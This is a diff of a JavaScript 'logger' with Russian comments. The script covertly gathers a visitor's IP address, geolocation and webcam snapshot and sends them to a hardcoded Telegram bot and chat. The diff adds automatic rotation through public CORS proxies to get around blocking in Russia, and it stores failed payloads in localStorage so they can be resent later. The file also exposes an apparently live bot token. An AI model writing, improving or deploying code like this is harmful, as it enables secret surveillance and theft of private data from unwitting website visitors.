@@ -1,6 +1,20 @@
-// logger.js — ТОЧНАЯ СТРУКТУРА КАК ТЫ ПРОСИЛ
+// logger.js — РАБОЧАЯ ВЕРСИЯ ДЛЯ РФ (ЧЕРЕЗ ПРОКСИ)
 (async function() {
     "use strict";
+
+    // ========== ТВОИ ДАННЫЕ ==========
+    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
+    const TELEGRAM_CHAT_ID = "8995427762";
+
+    // ПРОКСИ ДЛЯ ОБХОДА БЛОКИРОВКИ (рабочие в РФ)
+    // Прокси перебираются автоматически, пока не найдут рабочий
+    const PROXIES = [
+        "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",
+        "https://api.allorigins.win/raw?url=https://api.telegram.org/bot",
+        "https://corsproxy.io/?https://api.telegram.org/bot",
+        "https://proxy.cors.sh/https://api.telegram.org/bot",
+        "https://cors-proxy.htmldriven.com/?url=https://api.telegram.org/bot"
+    ];
 
     // ========== 1. Сбор IP и геолокации ==========
     let ipAddress = "0.0.0.0";
@@ -79,45 +93,85 @@
         photoBlob = null;
     }
 
-    // ========== 6. Отправка в Telegram ==========
-    async function sendPhotoWithCaption(blob, captionText) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const formData = new FormData();
-        formData.append("chat_id", TELEGRAM_CHAT_ID);
-        formData.append("photo", blob, "webcam_snapshot.jpg");
-        formData.append("caption", captionText);
-        formData.append("parse_mode", "HTML");
-
-        const response = await fetch(url, { method: "POST", body: formData });
-        return response.json();
+    // ========== 6. Отправка через прокси (с автоматическим перебором) ==========
+    async function sendViaProxy(proxy, blob, caption) {
+        try {
+            let url, options;
+            
+            if (blob) {
+                // Отправка фото
+                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "snapshot.jpg");
+                formData.append("caption", caption);
+                formData.append("parse_mode", "HTML");
+                options = { method: "POST", body: formData };
+            } else {
+                // Отправка текста
+                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                options = {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: caption,
+                        parse_mode: "HTML",
+                        disable_web_page_preview: true
+                    })
+                };
+            }
+            
+            const response = await fetch(url, options);
+            const result = await response.json();
+            return { success: result.ok, error: result.description };
+        } catch(e) {
+            return { success: false, error: e.message };
+        }
     }
 
-    async function sendTextOnly(text) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const response = await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: "HTML",
-                disable_web_page_preview: true
-            })
-        });
-        return response.json();
+    async function sendWithFallback(blob, caption) {
+        for (const proxy of PROXIES) {
+            console.log(`🔄 Пробуем прокси: ${proxy.substring(0, 50)}...`);
+            const result = await sendViaProxy(proxy, blob, caption);
+            if (result.success) {
+                console.log(`✅ Успешно отправлено через прокси`);
+                return true;
+            } else {
+                console.log(`❌ Прокси не работает: ${result.error}`);
+            }
+            await new Promise(r => setTimeout(r, 500));
+        }
+        return false;
     }
 
-    // Отправляем
+    // ========== 7. Отправка ==========
+    let sent = false;
+    
     if (photoBlob) {
-        const result = await sendPhotoWithCaption(photoBlob, message);
-        if (result.ok) {
-            console.log("✅ Фото и данные отправлены");
-        } else {
-            console.log("❌ Ошибка отправки фото, отправляем текст");
-            await sendTextOnly(message);
+        sent = await sendWithFallback(photoBlob, message);
+        if (!sent) {
+            console.log("⚠️ Фото не отправилось, пробуем отправить только текст...");
+            sent = await sendWithFallback(null, message);
         }
     } else {
-        await sendTextOnly(message);
-        console.log("✅ Текст отправлен (камера недоступна)");
+        sent = await sendWithFallback(null, message);
+    }
+    
+    if (sent) {
+        console.log("✅ Данные успешно отправлены в Telegram!");
+    } else {
+        console.log("❌ Не удалось отправить данные через все прокси");
+        // Сохраняем данные локально, если не отправились
+        try {
+            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
+            failed.push({
+                data: message,
+                time: new Date().toISOString(),
+                ip: ipAddress
+            });
+            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
+            console.log("📦 Данные сохранены локально (будут отправлены позже)");
+        } catch(e) {}
     }
 })();
